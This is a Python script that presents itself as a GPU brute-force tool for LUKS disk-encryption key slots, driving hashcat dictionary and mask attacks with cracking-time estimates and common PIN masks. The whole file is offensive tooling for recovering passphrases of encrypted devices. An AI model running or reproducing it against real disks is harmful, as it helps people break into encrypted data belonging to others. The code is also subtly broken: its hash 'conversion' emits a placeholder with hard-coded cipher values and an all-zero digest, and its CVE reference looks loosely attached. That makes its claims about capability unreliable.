#!/usr/bin/env python3
"""
LUKS PBKDF2 GPU Brute Force Tool
Exploits weak PBKDF2 key slots using hashcat GPU acceleration

Author: Penetration Testing Lab
Target: PBKDF2-based LUKS key slots
CVE: CVE-2021-4122 related attacks
"""

import subprocess
import os
import sys
import argparse
import json
import time
import re
from pathlib import Path
from typing import Dict, List, Optional

class LUKSBruteForcer:
    """GPU-accelerated brute force attack against LUKS PBKDF2 key slots"""
    
    def __init__(self):
        self.hashcat_path = self._find_hashcat()
        self.supported_attacks = {
            'dictionary': {'mode': 0, 'description': 'Dictionary attack'},
            'mask': {'mode': 3, 'description': 'Mask attack (brute force patterns)'},
            'hybrid_dict': {'mode': 6, 'description': 'Hybrid dictionary + mask'},
            'hybrid_mask': {'mode': 7, 'description': 'Hybrid mask + dictionary'}
        }
        
    def _find_hashcat(self) -> str:
        """Find hashcat binary path"""
        paths = ['/usr/bin/hashcat', '/usr/local/bin/hashcat', 'hashcat']
        
        for path in paths:
            try:
                subprocess.run([path, '--version'], capture_output=True, check=True)
                return path
            except (subprocess.CalledProcessError, FileNotFoundError):
                continue
        
        print("[WARNING] hashcat not found. Install with: apt install hashcat")
        return None
    
    def extract_luks_hash(self, device_path: str, slot_id: int = None) -> Optional[str]:
        """Extract LUKS hash for hashcat processing"""
        try:
            # Use luks2john or custom extraction
            hash_file = f"/tmp/luks_hash_{os.getpid()}.txt"
            
            if slot_id is not None:
                # Extract specific key slot
                cmd = ['cryptsetup', 'luksHeaderBackup', device_path, '--header-backup-file', '/tmp/luks_header.bin']
                subprocess.run(cmd, check=True)
                
                # Convert to hashcat format (LUKS hash mode 14600)
                luks_hash = self._convert_to_hashcat_format(device_path, slot_id)
                
                with open(hash_file, 'w') as f:
                    f.write(luks_hash)
                
                return hash_file
            else:
                print("[ERROR] Slot ID required for hash extraction")
                return None
                
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Failed to extract LUKS hash: {e}")
            return None
    
    def _convert_to_hashcat_format(self, device_path: str, slot_id: int) -> str:
        """Convert LUKS header to hashcat format"""
        try:
            # Get LUKS header information
            result = subprocess.run([
                'cryptsetup', 'luksDump', device_path
            ], capture_output=True, text=True, check=True)
            
            # Parse header for slot-specific information
            lines = result.stdout.split('\n')
            slot_info = {}
            in_target_slot = False
            
            for line in lines:
                line = line.strip()
                
                if f'Key Slot {slot_id}:' in line and 'ENABLED' in line:
                    in_target_slot = True
                elif line.startswith('Key Slot') and in_target_slot:
                    break
                elif in_target_slot and ':' in line:
                    key, value = line.split(':', 1)
                    key = key.strip().lower().replace(' ', '_')
                    value = value.strip()
                    slot_info[key] = value
            
            # Extract binary data from device
            # This is a simplified version - in real scenarios, you'd need
            # more sophisticated header parsing
            
            # Create hashcat-compatible hash (mode 14600)
            # Format: $luks$version$cipher$mode$hash$iterations$salt$digest
            
            version = "2"  # LUKS2
            cipher = "aes"
            mode = "xts-plain64"
            hash_algo = "sha256"
            iterations = slot_info.get('iterations', '1000').replace(',', '')
            salt = slot_info.get('salt', '00' * 32)
            
            # Simplified hash format (real implementation would extract actual binary data)
            luks_hash = f"$luks${version}${cipher}${mode}${hash_algo}${iterations}${salt}${'00' * 32}"
            
            return luks_hash
            
        except subprocess.CalledProcessError as e:
            print(f"[ERROR] Failed to convert LUKS hash: {e}")
            return ""
    
    def dictionary_attack(self, hash_file: str, wordlist_path: str, 
                         output_file: str = None) -> Dict:
        """Perform dictionary attack using hashcat"""
        if not self.hashcat_path:
            return {'error': 'hashcat not available'}
        
        if not Path(wordlist_path).exists():
            return {'error': f'Wordlist not found: {wordlist_path}'}
        
        cmd = [
            self.hashcat_path,
            '-m', '14600',  # LUKS hash mode
            '-a', '0',      # Dictionary attack
            hash_file,
            wordlist_path
        ]
        
        if output_file:
            cmd.extend(['--outfile', output_file])
        
        # Add performance optimizations
        cmd.extend([
            '--force',          # Ignore warnings
            '--optimized-kernel-enable',
            '--workload-profile', '3',  # High performance
            '--status',
            '--status-timer', '10'
        ])
        
        print(f"[INFO] Starting dictionary attack with {wordlist_path}")
        print(f"[CMD] {' '.join(cmd)}")
        
        start_time = time.time()
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
            end_time = time.time()
            
            attack_result = {
                'attack_type': 'dictionary',
                'wordlist': wordlist_path,
                'duration': end_time - start_time,
                'return_code': result.returncode,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'success': result.returncode == 0
            }
            
            # Parse output for found password
            if result.returncode == 0:
                password = self._parse_hashcat_output(result.stdout)
                if password:
                    attack_result['password'] = password
                    print(f"[SUCCESS] Password found: {password}")
            
            return attack_result
            
        except subprocess.TimeoutExpired:
            return {'error': 'Attack timed out after 1 hour'}
        except Exception as e:
            return {'error': f'Attack failed: {e}'}
    
    def mask_attack(self, hash_file: str, mask_pattern: str, 
                   output_file: str = None) -> Dict:
        """Perform mask attack (brute force with pattern)"""
        if not self.hashcat_path:
            return {'error': 'hashcat not available'}
        
        cmd = [
            self.hashcat_path,
            '-m', '14600',  # LUKS hash mode
            '-a', '3',      # Mask attack
            hash_file,
            mask_pattern
        ]
        
        if output_file:
            cmd.extend(['--outfile', output_file])
        
        # Performance optimizations
        cmd.extend([
            '--force',
            '--optimized-kernel-enable',
            '--workload-profile', '3',
            '--status',
            '--status-timer', '10'
        ])
        
        print(f"[INFO] Starting mask attack with pattern: {mask_pattern}")
        print(f"[CMD] {' '.join(cmd)}")
        
        start_time = time.time()
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=7200)  # 2 hours
            end_time = time.time()
            
            attack_result = {
                'attack_type': 'mask',
                'mask_pattern': mask_pattern,
                'duration': end_time - start_time,
                'return_code': result.returncode,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'success': result.returncode == 0
            }
            
            if result.returncode == 0:
                password = self._parse_hashcat_output(result.stdout)
                if password:
                    attack_result['password'] = password
                    print(f"[SUCCESS] Password found: {password}")
            
            return attack_result
            
        except subprocess.TimeoutExpired:
            return {'error': 'Mask attack timed out after 2 hours'}
        except Exception as e:
            return {'error': f'Attack failed: {e}'}
    
    def _parse_hashcat_output(self, output: str) -> Optional[str]:
        """Parse hashcat output to extract found password"""
        lines = output.split('\n')
        
        for line in lines:
            # Look for successful crack indication
            if ':' in line and '$luks$' in line:
                parts = line.split(':')
                if len(parts) >= 2:
                    return parts[-1].strip()
        
        return None
    
    def benchmark_gpu(self) -> Dict:
        """Benchmark GPU performance for LUKS attacks"""
        if not self.hashcat_path:
            return {'error': 'hashcat not available'}
        
        cmd = [
            self.hashcat_path,
            '-b',           # Benchmark mode
            '-m', '14600'   # LUKS hash mode
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            benchmark_data = {
                'return_code': result.returncode,
                'output': result.stdout,
                'performance': self._parse_benchmark_output(result.stdout)
            }
            
            return benchmark_data
            
        except subprocess.TimeoutExpired:
            return {'error': 'Benchmark timed out'}
        except Exception as e:
            return {'error': f'Benchmark failed: {e}'}
    
    def _parse_benchmark_output(self, output: str) -> Dict:
        """Parse hashcat benchmark output"""
        performance = {
            'hash_rate': None,
            'device_info': []
        }
        
        lines = output.split('\n')
        
        for line in lines:
            # Look for hash rate information
            if 'H/s' in line and '14600' in line:
                # Extract hash rate
                match = re.search(r'(\d+\.?\d*)\s*([kMG]?)H/s', line)
                if match:
                    rate = float(match.group(1))
                    unit = match.group(2)
                    
                    # Convert to H/s
                    multipliers = {'k': 1000, 'M': 1000000, 'G': 1000000000}
                    if unit in multipliers:
                        rate *= multipliers[unit]
                    
                    performance['hash_rate'] = rate
            
            # Extract device information
            elif 'OpenCL' in line or 'CUDA' in line:
                performance['device_info'].append(line.strip())
        
        return performance
    
    def generate_common_masks(self) -> List[Dict]:
        """Generate common PIN/password mask patterns"""
        masks = [
            # Numeric PINs
            {'pattern': '?d?d?d?d', 'description': '4-digit PIN'},
            {'pattern': '?d?d?d?d?d?d', 'description': '6-digit PIN'},
            {'pattern': '?d?d?d?d?d?d?d?d', 'description': '8-digit PIN'},
            {'pattern': '?d?d?d?d?d?d?d?d?d?d', 'description': '10-digit PIN'},
            
            # Date patterns
            {'pattern': '?d?d?d?d?d?d?d?d', 'description': 'Date DDMMYYYY'},
            {'pattern': '?d?d?d?d', 'description': 'Year YYYY'},
            
            # Simple passwords
            {'pattern': '?l?l?l?l?d?d?d?d', 'description': '4 letters + 4 digits'},
            {'pattern': '?u?l?l?l?l?d?d', 'description': 'Capital + 4 letters + 2 digits'},
            
            # Keyboard patterns
            {'pattern': '123456', 'description': 'Sequential numbers'},
            {'pattern': 'qwerty', 'description': 'QWERTY keyboard'},
            {'pattern': 'password', 'description': 'Common password'},
        ]
        
        return masks
    
    def estimate_attack_time(self, mask_pattern: str, hash_rate: float) -> Dict:
        """Estimate brute force attack time"""
        # Calculate keyspace for mask pattern
        charset_sizes = {
            '?d': 10,   # digits
            '?l': 26,   # lowercase
            '?u': 26,   # uppercase  
            '?s': 33,   # special chars
            '?a': 95    # all printable
        }
        
        keyspace = 1
        i = 0
        while i < len(mask_pattern):
            if i < len(mask_pattern) - 1 and mask_pattern[i:i+2] in charset_sizes:
                keyspace *= charset_sizes[mask_pattern[i:i+2]]
                i += 2
            else:
                keyspace *= 95  # Assume printable ASCII
                i += 1
        
        if hash_rate > 0:
            # Time for 50% probability
            avg_time = (keyspace / 2) / hash_rate
            max_time = keyspace / hash_rate
            
            return {
                'keyspace': keyspace,
                'hash_rate': hash_rate,
                'average_time_seconds': avg_time,
                'maximum_time_seconds': max_time,
                'average_time_human': self._format_time(avg_time),
                'maximum_time_human': self._format_time(max_time)
            }
        else:
            return {'keyspace': keyspace, 'error': 'No hash rate data'}
    
    def _format_time(self, seconds: float) -> str:
        """Format time in human-readable format"""
        if seconds < 60:
            return f"{seconds:.1f} seconds"
        elif seconds < 3600:
            return f"{seconds/60:.1f} minutes"
        elif seconds < 86400:
            return f"{seconds/3600:.1f} hours"
        elif seconds < 31536000:
            return f"{seconds/86400:.1f} days"
        else:
            return f"{seconds/31536000:.1f} years"


def main():
    parser = argparse.ArgumentParser(description='LUKS PBKDF2 GPU Brute Force Tool')
    parser.add_argument('device', help='Path to LUKS device')
    parser.add_argument('-s', '--slot', type=int, default=0, help='Key slot to attack (default: 0)')
    parser.add_argument('-a', '--attack', choices=['dict', 'mask', 'benchmark'], 
                       default='dict', help='Attack type')
    parser.add_argument('-w', '--wordlist', help='Wordlist for dictionary attack')
    parser.add_argument('-m', '--mask', help='Mask pattern for brute force')
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('--show-masks', action='store_true', help='Show common mask patterns')
    parser.add_argument('--estimate', help='Estimate attack time for mask pattern')
    
    args = parser.parse_args()
    
    bruteforcer = LUKSBruteForcer()
    
    # Show common mask patterns
    if args.show_masks:
        print("Common Mask Patterns for LUKS Attacks:")
        print("="*50)
        masks = bruteforcer.generate_common_masks()
        
        for i, mask in enumerate(masks, 1):
            print(f"{i:2d}. {mask['pattern']:<20} - {mask['description']}")
        
        print("\nMask Characters:")
        print("?d = digit (0-9)")
        print("?l = lowercase letter (a-z)")
        print("?u = uppercase letter (A-Z)")
        print("?s = special character")
        print("?a = all printable ASCII")
        return
    
    # Estimate attack time
    if args.estimate:
        print(f"[INFO] Estimating attack time for mask: {args.estimate}")
        
        # Get GPU benchmark first
        benchmark = bruteforcer.benchmark_gpu()
        if 'performance' in benchmark and benchmark['performance']['hash_rate']:
            hash_rate = benchmark['performance']['hash_rate']
            estimate = bruteforcer.estimate_attack_time(args.estimate, hash_rate)
            
            print(f"Keyspace: {estimate['keyspace']:,}")
            print(f"Hash Rate: {hash_rate:,.0f} H/s")
            print(f"Average Time: {estimate['average_time_human']}")
            print(f"Maximum Time: {estimate['maximum_time_human']}")
        else:
            print("[ERROR] Could not determine GPU hash rate")
        return
    
    # Verify device exists
    if not Path(args.device).exists():
        print(f"[ERROR] Device not found: {args.device}")
        sys.exit(1)
    
    # Run benchmark
    if args.attack == 'benchmark':
        print("[INFO] Running GPU benchmark for LUKS attacks...")
        benchmark = bruteforcer.benchmark_gpu()
        
        if 'error' in benchmark:
            print(f"[ERROR] {benchmark['error']}")
        else:
            print(f"Benchmark Results:")
            if benchmark.get('performance', {}).get('hash_rate'):
                hash_rate = benchmark['performance']['hash_rate']
                print(f"Hash Rate: {hash_rate:,.0f} H/s")
            
            for device in benchmark.get('performance', {}).get('device_info', []):
                print(f"Device: {device}")
        return
    
    # Extract LUKS hash
    print(f"[INFO] Extracting LUKS hash from slot {args.slot}...")
    hash_file = bruteforcer.extract_luks_hash(args.device, args.slot)
    
    if not hash_file:
        print("[ERROR] Failed to extract LUKS hash")
        sys.exit(1)
    
    try:
        # Perform attack
        if args.attack == 'dict':
            if not args.wordlist:
                print("[ERROR] Wordlist required for dictionary attack")
                sys.exit(1)
            
            result = bruteforcer.dictionary_attack(hash_file, args.wordlist, args.output)
        
        elif args.attack == 'mask':
            if not args.mask:
                print("[ERROR] Mask pattern required for mask attack")
                sys.exit(1)
            
            result = bruteforcer.mask_attack(hash_file, args.mask, args.output)
        
        # Print results
        if 'error' in result:
            print(f"[ERROR] {result['error']}")
        else:
            print(f"\n[ATTACK RESULTS]")
            print(f"Attack Type: {result['attack_type']}")
            print(f"Duration: {result['duration']:.2f} seconds")
            print(f"Success: {result['success']}")
            
            if 'password' in result:
                print(f"PASSWORD FOUND: {result['password']}")
            elif not result['success']:
                print("Password not found in this attack")
    
    finally:
        # Clean up temporary files
        if hash_file and Path(hash_file).exists():
            os.unlink(hash_file)


if __name__ == "__main__":
    main()